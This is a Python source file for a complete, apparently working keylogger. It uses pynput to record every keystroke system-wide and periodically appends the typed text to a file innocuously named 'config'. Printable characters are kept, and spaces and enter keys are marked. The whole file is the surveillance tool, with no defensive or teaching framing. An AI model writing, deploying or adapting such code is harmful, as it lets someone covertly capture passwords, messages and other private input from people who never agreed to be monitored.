from pynput.keyboard import Key, Listener 
from threading import Timer

class Main: 
    def __init__(self, file_name):
        self.listener = Listener(on_press=self.key_listen)
        self.fn = file_name
        self.file = open(self.fn, 'a')
        self.keys = []
        self.count = 0
        self.key_time = 0
        self.t = Timer(1.0, self.key_timer_nit)

    def key_timer_nit(self):
        return

    def key_listen(self, key):
        self.key_save_timer()
       
        self.keys.append(key)
        if key == Key.esc:
            return False
        self.count += 1 
        if self.count >= 10: 
            return self.key_state_clean_write()

    def key_write(self):
        with open(self.fn, 'a') as file:
            for key in self.keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write('\n')
                elif k.find("Key") == -1: 
                    file.write(k)
                elif k.find("enter") > 0:
                    file.write('<E>')

    def key_save_timer(self):
        self.t.cancel()
        self.t = Timer(10.0, self.key_state_clean_write)
        self.t.start()
        

    def key_state_clean_write(self):
        if not self.keys:
            return
        self.count = 0
        self.key_write()
        self.keys = []

    def setup(self):
        self.listener.start()

    def join(self):
        self.listener.join()

def main():
    Logger = Main('config')
    Logger.setup()
    Logger.join()
    
if __name__ == "__main__":
    main()
